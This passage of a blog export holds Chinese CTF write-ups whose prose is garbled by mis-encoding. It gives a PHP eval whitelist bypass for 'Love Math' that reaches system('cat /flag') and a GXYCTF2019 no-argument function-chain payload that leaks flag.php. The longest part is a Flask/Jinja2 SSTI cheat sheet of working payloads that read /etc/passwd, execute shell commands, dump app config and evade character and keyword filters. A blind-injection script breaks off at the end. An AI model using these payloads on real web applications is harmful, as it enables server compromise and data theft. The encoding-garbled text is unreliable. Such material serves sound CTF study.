<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;ä¾‹å­ c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;å¸¸ç”¨æ•°å­¦å‡½æ•°http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi&#x3D;system&amp;cos&#x3D;cat &#x2F;flag</span><br><span class="line">base_convert(37907361743,10,36)&#x3D;&gt;hex2bin</span><br><span class="line">dechex(1598506324)&#x3D;&gt;&quot;5f474554&quot;</span><br><span class="line">hex2bin(&quot;5f474554&quot;)&#x3D;&gt;_GET</span><br><span class="line">$$pi&#x3D;&gt;$_GET</span><br><span class="line">($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi&#x3D;system&amp;cos&#x3D;cat &#x2F;flag&#x3D;&gt;$_GET&#123;pi&#125;$_GET&#123;cos&#125;pi&#x3D;system&amp;cos&#x3D;cat</span><br></pre></td></tr></table></figure>
<h2 id="ç›¸åŒç±»å‹"><a href="#ç›¸åŒç±»å‹" class="headerlink" title="ç›¸åŒç±»å‹"></a>ç›¸åŒç±»å‹</h2><ul>
<li>[NESTCTF 2019]Love Math 1</li>
<li>[NESTCTF 2019]Love Math 2</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[<a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 åˆèµ›]Love Math</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</title>
    <url>/2020/03/16/CTF_WP/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83%20WP/</url>
    <content><![CDATA[<h1 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h1><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</span><br><span class="line">scandir() åˆ—å‡º images ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚</span><br><span class="line">readfile() è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚</span><br><span class="line">current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</span><br><span class="line">pos() current() çš„åˆ«åã€‚</span><br><span class="line">next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">array_reverse()ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚</span><br><span class="line">highlight_file()æ‰“å°è¾“å‡ºæˆ–è€…è¿”å› filename æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ã€‚</span><br><span class="line">show_source() æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>imgåé¢çš„å‚æ•°base32,base63,hexè§£ç å¾—555.png</p>
<p>index.php hex,base64,base32ç¼–ç ä¼ å‚imgåœ¨ç½‘é¡µæºä»£ç imgæ ‡ç­¾è§£ç base64å¾—åˆ°æºç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">                @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦åˆ©ç”¨ç‚¹<code>pos(localeconv())</code>æˆ–è€…<code>current(localeconv())</code>å˜æˆ<code>.</code></p>
<p><code>array_reverse</code>æ•°ç»„åè½¬</p>
<p><code>next</code>å°†æŒ‡é’ˆæŒ‡å‘ç¬¬äºŒä¸ª,ä¸ºflag.php</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>FlaskSSTI</title>
    <url>/2020/03/15/CTF/FlaskSSTI%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="FlaskSSTI"><a href="#FlaskSSTI" class="headerlink" title="FlaskSSTI"></a>FlaskSSTI</h1><h2 id="0x00é­”æœ¯æ–¹æ³•"><a href="#0x00é­”æœ¯æ–¹æ³•" class="headerlink" title="0x00é­”æœ¯æ–¹æ³•"></a>0x00é­”æœ¯æ–¹æ³•</h2><a id="more"></a>

<ul>
<li><strong>dict</strong>ï¼šä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸</li>
<li><strong>class</strong>ï¼šè¿”å›è°ƒç”¨çš„å‚æ•°ç±»å‹</li>
<li><strong>mro</strong>ï¼šè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚</li>
<li><strong>bases</strong>ï¼šè¿”å›ç±»å‹åˆ—è¡¨</li>
<li><strong>subclasses</strong>ï¼šè¿”å›objectçš„å­ç±»</li>
<li><strong>init</strong>ï¼šç±»çš„åˆå§‹åŒ–æ–¹æ³•</li>
<li><strong>globals</strong>ï¼šå‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡ ä¸ func_globals ç­‰ä»·</li>
</ul>
<p><code>__base__</code> å’Œ <code>__mro__</code> éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„ã€‚</p>
<h2 id="0x01åŸºæœ¬æµç¨‹"><a href="#0x01åŸºæœ¬æµç¨‹" class="headerlink" title="0x01åŸºæœ¬æµç¨‹"></a>0x01åŸºæœ¬æµç¨‹</h2><p>å¯ä»¥åˆ©ç”¨<code>2</code>ç®€å•ä»£ç æµ‹è¯•æ˜¯å¦å­˜åœ¨SSTI</p>
<p>ä½¿ç”¨é­”æœ¯æ–¹æ³•è¿›è¡Œå‡½æ•°è§£æï¼Œå†è·å–åŸºæœ¬ç±»objectï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8] &#x2F;&#x2F;é’ˆå¯¹jinjia2&#x2F;flaskä¸º[9]é€‚ç”¨</span><br></pre></td></tr></table></figure>
<p>è·å–åˆ°åŸºæœ¬ç±»ä¹‹å,å¯ä»¥ç»§ç»­ä½¿ç”¨subclassesè·å–objectçš„å­ç±»:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.__subclasses__()</span><br><span class="line"></span><br><span class="line">#æ”¹å˜æ•°å­—å¯ä»¥çˆ†ç ´</span><br><span class="line">object.__subclasses__[10]</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°é‡è½½è¿‡çš„<code>__init__</code>ç±»ï¼ˆåœ¨è·å–åˆå§‹åŒ–å±æ€§åï¼Œå¸¦ wrapper çš„è¯´æ˜æ²¡æœ‰é‡è½½ï¼Œå¯»æ‰¾ä¸å¸¦ warpper çš„):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[99].__init__</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹å…¶å¼•ç”¨ <code>__builtins__</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</span><br></pre></td></tr></table></figure>
<p>è¯»å†™æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#è¯»</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">#å†™</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).write()</span><br><span class="line"></span><br><span class="line">#è‹¥å­˜åœ¨å­æ¨¡å—,å¯ä»¥ç›´æ¥è°ƒç”¨è¯»å†™æ–‡ä»¶</span><br><span class="line">[].__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line">[].__class__.__base__.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).write()</span><br></pre></td></tr></table></figure>
<h2 id="0x02å‘½ä»¤æ‰§è¡Œ"><a href="#0x02å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="0x02å‘½ä»¤æ‰§è¡Œ"></a>0x02å‘½ä»¤æ‰§è¡Œ</h2><h3 id="åˆ©ç”¨eval-è¿›è¡Œå‘½ä»¤æ‰§è¡Œ"><a href="#åˆ©ç”¨eval-è¿›è¡Œå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="åˆ©ç”¨eval è¿›è¡Œå‘½ä»¤æ‰§è¡Œ"></a>åˆ©ç”¨eval è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</span><br></pre></td></tr></table></figure>
<h3 id="åˆ©ç”¨warnings-catch-warnings-è¿›è¡Œå‘½ä»¤æ‰§è¡Œ"><a href="#åˆ©ç”¨warnings-catch-warnings-è¿›è¡Œå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="åˆ©ç”¨warnings.catch_warnings è¿›è¡Œå‘½ä»¤æ‰§è¡Œ"></a>åˆ©ç”¨warnings.catch_warnings è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</h3><p>æŸ¥çœ‹<code>warnings.catch_warnings</code>æ–¹æ³•çš„ä½ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹<code>linecatch</code>çš„ä½ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#39;linecache&#39;)25</span><br></pre></td></tr></table></figure>
<p>æŸ¥æ‰¾<code>os</code>æ¨¡å—çš„ä½ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.keys().index(&#39;os&#39;)12</span><br></pre></td></tr></table></figure>
<p>æŸ¥æ‰¾<code>system</code>æ–¹æ³•çš„ä½ç½®(åœ¨è¿™é‡Œä½¿ç”¨<code>os.open().read()</code>å¯ä»¥å®ç°ä¸€æ ·çš„æ•ˆæœ,æ­¥éª¤ä¸€æ ·,ä¸å†å¤è¿°)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.keys().index(&#39;system&#39;)144</span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨<code>system</code>æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;)root0</span><br></pre></td></tr></table></figure>
<h3 id="åˆ©ç”¨commands-è¿›è¡Œå‘½ä»¤æ‰§è¡Œ"><a href="#åˆ©ç”¨commands-è¿›è¡Œå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="åˆ©ç”¨commands è¿›è¡Œå‘½ä»¤æ‰§è¡Œ"></a>åˆ©ç”¨commands è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()</span><br></pre></td></tr></table></figure>
<h2 id="0x04å¸¸è§ç»•è¿‡æ–¹å¼"><a href="#0x04å¸¸è§ç»•è¿‡æ–¹å¼" class="headerlink" title="0x04å¸¸è§ç»•è¿‡æ–¹å¼"></a>0x04å¸¸è§ç»•è¿‡æ–¹å¼</h2><h4 id="ç»•è¿‡ä¸­æ‹¬å·"><a href="#ç»•è¿‡ä¸­æ‹¬å·" class="headerlink" title="ç»•è¿‡ä¸­æ‹¬å·"></a>ç»•è¿‡ä¸­æ‹¬å·</h4><p>pop() å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br></pre></td></tr></table></figure>
<p>åœ¨è¿™é‡Œä½¿ç”¨popå¹¶ä¸ä¼šçœŸçš„ç§»é™¤,ä½†å´èƒ½è¿”å›å…¶å€¼,å–ä»£ä¸­æ‹¬å·,æ¥å®ç°ç»•è¿‡</p>
<h4 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a>è¿‡æ»¤å¼•å·</h4><p><code>request.args</code> æ˜¯flaskä¸­çš„ä¸€ä¸ªå±æ€§,ä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°,è¿™é‡ŒæŠŠ<code>path</code>å½“ä½œå˜é‡å,å°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥,è¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p>å…ˆè·å–chrå‡½æ•°ï¼Œèµ‹å€¼ç»™chrï¼Œåé¢æ‹¼æ¥å­—ç¬¦ä¸²å°±å¥½äº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="è¿‡æ»¤ä¸‹åˆ’çº¿"><a href="#è¿‡æ»¤ä¸‹åˆ’çº¿" class="headerlink" title="è¿‡æ»¤ä¸‹åˆ’çº¿"></a>è¿‡æ»¤ä¸‹åˆ’çº¿</h4><p>åŒæ ·åˆ©ç”¨<code>request.args</code>å±æ€§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure>
<p>å°†å…¶ä¸­çš„<code>request.args</code>æ”¹ä¸º<code>request.values</code>åˆ™åˆ©ç”¨postçš„æ–¹å¼è¿›è¡Œä¼ å‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#GET:</span><br><span class="line">&#123;&#123; &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;</span><br><span class="line">#POST:</span><br><span class="line">class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure>
<h4 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h4><p><strong>base64ç¼–ç ç»•è¿‡</strong><br><code>__getattribute__</code>ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶,è°ƒç”¨è¯¥æ–¹æ³•</p>
<p>ä¾‹å¦‚è¢«è¿‡æ»¤æ‰<code>__class__</code>å…³é”®è¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="åŒæ—¶ç»•è¿‡ä¸‹åˆ’çº¿ã€ä¸ä¸­æ‹¬å·"><a href="#åŒæ—¶ç»•è¿‡ä¸‹åˆ’çº¿ã€ä¸ä¸­æ‹¬å·" class="headerlink" title="åŒæ—¶ç»•è¿‡ä¸‹åˆ’çº¿ã€ä¸ä¸­æ‹¬å·"></a>åŒæ—¶ç»•è¿‡ä¸‹åˆ’çº¿ã€ä¸ä¸­æ‹¬å·</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(&#39;&#x2F;opt&#x2F;flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)|attr(request.values.name5)()&#125;&#125;post:name1&#x3D;__class__&amp;name2&#x3D;__base__&amp;name3&#x3D;__subclasses__&amp;name4&#x3D;pop&amp;name5&#x3D;read</span><br></pre></td></tr></table></figure>
<h4 id="ç»•è¿‡-è¿‡æ»¤"><a href="#ç»•è¿‡-è¿‡æ»¤" class="headerlink" title="ç»•è¿‡.è¿‡æ»¤"></a>ç»•è¿‡<code>.</code>è¿‡æ»¤</h4><p>è‹¥<code>.</code>ä¹Ÿè¢«è¿‡æ»¤ï¼Œä½¿ç”¨åŸç”ŸJinJa2å‡½æ•°<code>|attr()</code><br>å°†<code>request.__class__</code>æ”¹æˆ<code>request|attr(&quot;__class__&quot;)</code></p>
<h4 id="è¯»å–configä¸­flag-ç»•è¿‡"><a href="#è¯»å–configä¸­flag-ç»•è¿‡" class="headerlink" title="è¯»å–configä¸­flag,ç»•è¿‡"></a>è¯»å–configä¸­flag,ç»•è¿‡</h4><h5 id="ç›´æ¥ä½¿ç”¨config"><a href="#ç›´æ¥ä½¿ç”¨config" class="headerlink" title="ç›´æ¥ä½¿ç”¨config"></a>ç›´æ¥ä½¿ç”¨config</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="åˆ©ç”¨self"><a href="#åˆ©ç”¨self" class="headerlink" title="åˆ©ç”¨self"></a>åˆ©ç”¨self</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="è¿˜å¯ä»¥åˆ©ç”¨flaskçš„å†…ç½®å‡½æ•°å’Œç±»"><a href="#è¿˜å¯ä»¥åˆ©ç”¨flaskçš„å†…ç½®å‡½æ•°å’Œç±»" class="headerlink" title="è¿˜å¯ä»¥åˆ©ç”¨flaskçš„å†…ç½®å‡½æ•°å’Œç±»"></a>è¿˜å¯ä»¥åˆ©ç”¨flaskçš„å†…ç½®å‡½æ•°å’Œç±»</h5><p><code>url_forã€gã€requestã€namespaceã€lipsumã€rangeã€sessionã€dictã€get_flashed_messagesã€cyclerã€joinerã€config</code>ç­‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="è¿‡æ»¤å¤§æ‹¬å·"><a href="#è¿‡æ»¤å¤§æ‹¬å·" class="headerlink" title="è¿‡æ»¤å¤§æ‹¬å·"></a>è¿‡æ»¤å¤§æ‹¬å·</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¯ä»¥åˆ©ç”¨&#123;%%&#125;æ›¿ä»£&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ç›²æ³¨æ–‡ä»¶å†…å®¹"><a href="#ç›²æ³¨æ–‡ä»¶å†…å®¹" class="headerlink" title="ç›²æ³¨æ–‡ä»¶å†…å®¹"></a>ç›²æ³¨æ–‡ä»¶å†…å®¹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;flag&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39;%&#125;~p0~&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">#è„šæœ¬</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">def check(payload):</span><br><span class="line">    postdata &#x3D; &#123;</span><br><span class="line">        &#39;exploit&#39;:payload</span><br><span class="line">        &#125;</span><br><span class="line">    r &#x3D; requests.post(url, 